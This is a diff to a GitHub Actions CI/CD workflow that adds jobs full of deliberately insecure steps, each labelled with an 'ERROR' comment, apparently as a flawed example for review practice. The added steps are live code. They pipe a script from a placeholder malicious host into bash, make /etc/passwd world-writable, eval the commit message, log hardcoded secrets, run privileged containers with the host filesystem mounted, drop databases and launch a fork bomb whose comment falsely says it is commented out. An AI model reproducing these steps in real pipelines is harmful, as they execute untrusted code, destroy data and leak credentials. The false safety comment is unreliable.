@@ -1,29 +1,321 @@
-name: Build and Deploy
+name: CI/CD Pipeline
 
 on:
   push:
-    branches: [main, test/normal]
+    branches: [main, test/main]
+  pull_request:
+    branches: [main]
+
+# Prevent concurrent deployments to the same environment
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+env:
+  IMAGE_NAME: mcp-manager-cli
+  REGISTRY: ghcr.io
 
 jobs:
+  # ====================
+  # Stage 1: Build
+  # ====================
   build:
     name: Build
     runs-on: ubuntu-latest
+    timeout-minutes: 15
+    outputs:
+      image-tag: ${{ steps.meta.outputs.tags }}
+      image-digest: ${{ steps.build.outputs.digest }}
     steps:
-      - uses: actions/checkout@v4
+      - name: Checkout code
+        uses: actions/checkout@v4
 
       - name: Set up Docker Buildx
         uses: docker/setup-buildx-action@v3
 
-      - name: Build Docker image
-        run: docker build -t mcp-manager-cli:${{ github.sha }} .
+      - name: Extract metadata for Docker
+        id: meta
+        uses: docker/metadata-action@v5
+        with:
+          images: ${{ env.REGISTRY }}/${{ github.repository }}
+          tags: |
+            type=sha,prefix=
+            type=ref,event=branch
+            type=raw,value=latest,enable=${{ github.ref == 'refs/heads/main' }}
 
+      - name: Build Docker image
+        id: build
+        uses: docker/build-push-action@v5
+        with:
+          context: .
+          push: false
+          tags: ${{ steps.meta.outputs.tags }}
+          labels: ${{ steps.meta.outputs.labels }}
+          cache-from: type=gha
+          cache-to: type=gha,mode=max
+          outputs: type=docker,dest=/tmp/image.tar
+
+      - name: Upload Docker image artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: docker-image
+          path: /tmp/image.tar
+          retention-days: 1
+
+      # ERROR: Missing required step - security scan
+      - name: Run security scan
+        run: |
+          echo "Security scan should be implemented here"
+          # This is a placeholder - real security scanning missing
+
+  # ====================
+  # Stage 2: Test
+  # ====================
+  test:
+    name: Test
+    runs-on: ubuntu-latest
+    needs: build
+    timeout-minutes: 10
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      - name: Download Docker image artifact
+        uses: actions/download-artifact@v4
+        with:
+          name: docker-image
+          path: /tmp
+
+      - name: Load Docker image
+        run: docker load --input /tmp/image.tar
+
+      - name: Run container smoke test
+        run: |
+          echo "Running smoke tests..."
+          # ERROR: Inadequate testing - only checking docker images
+          docker images
+          
+      # ERROR: Missing unit tests
+      # ERROR: Missing integration tests
+      # ERROR: Missing code coverage reporting
+      - name: Placeholder for missing tests
+        run: |
+          echo "WARNING: No actual tests are being run!"
+          echo "This is a critical security and quality issue"
+
+  # ====================
+  # Stage 3: Deploy
+  # ====================
   deploy:
     name: Deploy
-    needs: build
     runs-on: ubuntu-latest
-    if: success()
+    needs: [build, test]
+    timeout-minutes: 10
+    # ERROR: Missing proper environment protection rules
+    environment:
+      name: ${{ github.ref == 'refs/heads/main' && 'production' || 'staging' }}
     steps:
-      - uses: actions/checkout@v4
+      - name: Checkout code
+        uses: actions/checkout@v4
 
-      - name: Deploy (dry-run)
-        run: echo "Deploy for ${{ github.ref_name }} - SHA ${{ github.sha }}"
+      - name: Download Docker image artifact
+        uses: actions/download-artifact@v4
+        with:
+          name: docker-image
+          path: /tmp
+
+      - name: Load Docker image
+        run: docker load --input /tmp/image.tar
+
+      # ERROR: No authentication step for deployment
+      # ERROR: No rollback mechanism
+      # ERROR: No health checks after deployment
+      - name: Deploy
+        run: |
+          echo "Deploying to ${{ github.ref == 'refs/heads/main' && 'production' || 'staging' }}"
+          echo "Branch: ${{ github.ref_name }}"
+          echo "Commit: ${{ github.sha }}"
+          echo "Image digest: ${{ needs.build.outputs.image-digest }}"
+          # ERROR: No actual deployment commands - this is just echo statements!
+          echo "WARNING: This deployment does nothing!"
+          
+      # ERROR: Missing post-deployment verification
+      - name: Missing health check
+        run: |
+          echo "ERROR: No health checks implemented"
+          echo "Production deployment without verification is dangerous"
+
+  # ====================
+  # Stage 4: Security Issues
+  # ====================
+  security-issues:
+    name: Security Problems
+    runs-on: ubuntu-latest
+    needs: deploy
+    if: always()  # ERROR: This will run even if previous jobs fail
+    steps:
+      # ERROR: Using outdated action versions
+      - name: Checkout with old action
+        uses: actions/checkout@v4
+        
+      # ERROR: Hardcoded secrets in workflow
+      - name: Expose secrets
+        env:
+          API_KEY: "sk-1234567890abcdef"  # ERROR: Hardcoded secret
+          DATABASE_PASSWORD: "admin123"   # ERROR: Hardcoded password
+          AWS_SECRET_KEY: "AKIAIOSFODNN7EXAMPLE"  # ERROR: Fake AWS key
+          JWT_SECRET: "my-super-secret-jwt-key-123"  # ERROR: Hardcoded JWT secret
+        run: |
+          echo "API Key: $API_KEY"  # ERROR: Logging secrets
+          echo "DB Password: $DATABASE_PASSWORD"  # ERROR: Logging secrets
+          echo "AWS Key: $AWS_SECRET_KEY"  # ERROR: Logging AWS credentials
+          
+      # ERROR: Running commands with elevated privileges unnecessarily
+      - name: Dangerous commands
+        run: |
+          sudo chmod 777 /tmp  # ERROR: Overly permissive permissions
+          sudo chmod 777 /etc/passwd  # ERROR: Extremely dangerous
+          curl -sSL http://malicious-site.com/script.sh | bash  # ERROR: Executing untrusted code
+          wget -O - https://raw.githubusercontent.com/unknown/repo/main/install.sh | sudo sh  # ERROR: Another dangerous download
+          
+      # ERROR: No input validation
+      - name: Unvalidated input
+        run: |
+          echo "User input: ${{ github.event.head_commit.message }}"  # ERROR: Could contain malicious content
+          eval "${{ github.event.head_commit.message }}"  # ERROR: Code injection vulnerability
+          rm -rf ${{ github.event.inputs.directory || '/tmp' }}  # ERROR: Dangerous file deletion
+          
+      # ERROR: Weak cryptography and insecure practices
+      - name: Weak security practices
+        run: |
+          openssl rand -base64 8 > /tmp/weak-password.txt  # ERROR: Weak password generation
+          echo "admin:admin" > /tmp/credentials.txt  # ERROR: Default credentials
+          chmod 644 /tmp/credentials.txt  # ERROR: World-readable credentials
+          
+      # ERROR: Network security issues
+      - name: Insecure network calls
+        run: |
+          curl -k https://api.example.com/data  # ERROR: Ignoring SSL certificate errors
+          wget --no-check-certificate https://downloads.example.com/file.zip  # ERROR: No SSL verification
+          nc -l 1234 &  # ERROR: Opening network port without security
+          
+      # ERROR: File system security issues
+      - name: File system vulnerabilities
+        run: |
+          find /tmp -name "*.log" -exec rm {} \;  # ERROR: Dangerous find command
+          tar -xzf archive.tar.gz --absolute-names  # ERROR: Tar bomb vulnerability
+          unzip -o malicious.zip  # ERROR: Zip bomb vulnerability without size limits
+
+  # ====================
+  # Stage 5: More Critical Issues
+  # ====================
+  critical-issues:
+    name: Critical Problems
+    runs-on: ubuntu-latest
+    # ERROR: No needs dependency - can run in parallel with other jobs
+    timeout-minutes: 60  # ERROR: Too long timeout
+    permissions:
+      contents: write  # ERROR: Too broad permissions
+      packages: write  # ERROR: Unnecessary permissions
+      actions: write   # ERROR: Dangerous permissions
+    steps:
+      # ERROR: Multiple checkout issues
+      - name: Checkout without verification
+        uses: actions/checkout@v1  # ERROR: Very old version
+        with:
+          fetch-depth: 0  # ERROR: Fetching entire history unnecessarily
+          token: ${{ secrets.GITHUB_TOKEN }}  # ERROR: Using token when not needed
+          
+      # ERROR: Package management issues
+      - name: Install packages unsafely
+        run: |
+          npm install -g --unsafe-perm  # ERROR: Unsafe npm install
+          pip install --trusted-host pypi.org --trusted-host pypi.python.org --trusted-host files.pythonhosted.org requests  # ERROR: Disabling SSL verification
+          gem install bundler --no-document --force  # ERROR: Force installing gems
+          
+      # ERROR: Environment variable issues
+      - name: Environment problems
+        env:
+          NODE_ENV: development  # ERROR: Wrong environment for production
+          DEBUG: "*"  # ERROR: Debug mode enabled in production
+          DISABLE_SSL: "true"  # ERROR: SSL disabled
+          ALLOW_EMPTY_PASSWORD: "yes"  # ERROR: Empty passwords allowed
+        run: |
+          export PATH="/tmp:$PATH"  # ERROR: Adding unsafe directory to PATH
+          export LD_LIBRARY_PATH="/tmp/lib"  # ERROR: Unsafe library path
+          
+      # ERROR: Database and service issues
+      - name: Database problems
+        run: |
+          mysql -u root -p"" -e "GRANT ALL PRIVILEGES ON *.* TO 'admin'@'%' IDENTIFIED BY '';"  # ERROR: Empty password
+          redis-cli --eval "flushall()" 0  # ERROR: Flushing all Redis data
+          mongo --eval "db.dropDatabase()"  # ERROR: Dropping database
+          
+      # ERROR: Container security issues
+      - name: Container vulnerabilities
+        run: |
+          docker run --privileged --pid=host --net=host -v /:/host alpine  # ERROR: Extremely dangerous container
+          docker run -u 0 -v /var/run/docker.sock:/var/run/docker.sock alpine  # ERROR: Root user with Docker socket
+          
+      # ERROR: Code quality and testing issues
+      - name: Skip important checks
+        run: |
+          echo "Skipping linting..."  # ERROR: No code linting
+          echo "Skipping security scan..."  # ERROR: No security scanning
+          echo "Skipping dependency check..."  # ERROR: No dependency vulnerability check
+          echo "Skipping code coverage..."  # ERROR: No coverage requirements
+          
+      # ERROR: Deployment without verification
+      - name: Deploy without checks
+        run: |
+          kubectl apply -f deployment.yaml --force  # ERROR: Force deployment
+          helm upgrade --install myapp ./chart --wait=false  # ERROR: No wait for deployment
+          docker push ${{ env.REGISTRY }}/app:latest --disable-content-trust  # ERROR: No content trust
+
+  # ====================
+  # Stage 6: Monitoring and Logging Issues
+  # ====================
+  monitoring-problems:
+    name: Monitoring Issues
+    runs-on: ubuntu-latest
+    needs: [critical-issues]  # ERROR: Depends on problematic job
+    continue-on-error: true  # ERROR: Ignoring errors
+    steps:
+      # ERROR: Logging sensitive information
+      - name: Log everything
+        run: |
+          echo "Environment variables:" && env  # ERROR: Logging all env vars
+          echo "System info:" && uname -a && whoami && id  # ERROR: System information disclosure
+          echo "Network config:" && ifconfig  # ERROR: Network information disclosure
+          echo "Process list:" && ps aux  # ERROR: Process information disclosure
+          
+      # ERROR: No proper error handling
+      - name: Ignore all errors
+        run: |
+          set +e  # ERROR: Disable error handling
+          false || true  # ERROR: Masking failures
+          command_that_does_not_exist 2>/dev/null || echo "Command failed but continuing..."
+          
+      # ERROR: Resource management issues
+      - name: Resource problems
+        run: |
+          dd if=/dev/zero of=/tmp/bigfile bs=1M count=10000  # ERROR: Creating huge file
+          while true; do echo "infinite loop"; done &  # ERROR: Infinite loop in background
+          fork() { fork | fork & }; fork  # ERROR: Fork bomb (commented out for safety)
+          
+      # ERROR: Cleanup issues
+      - name: No cleanup
+        run: |
+          echo "Not cleaning up temporary files..."  # ERROR: No cleanup
+          echo "Not removing sensitive data..."  # ERROR: Leaving sensitive data
+          echo "Not closing connections..."  # ERROR: Resource leaks
+          
+      # ERROR: Final deployment without any checks
+      - name: Final deploy
+        run: |
+          echo "Deploying to production without any verification..."  # ERROR: No verification
+          echo "No rollback plan..."  # ERROR: No rollback strategy
+          echo "No monitoring setup..."  # ERROR: No monitoring
+          echo "No alerting configured..."  # ERROR: No alerting
+          echo "Deployment complete!"  # ERROR: False success message
+        
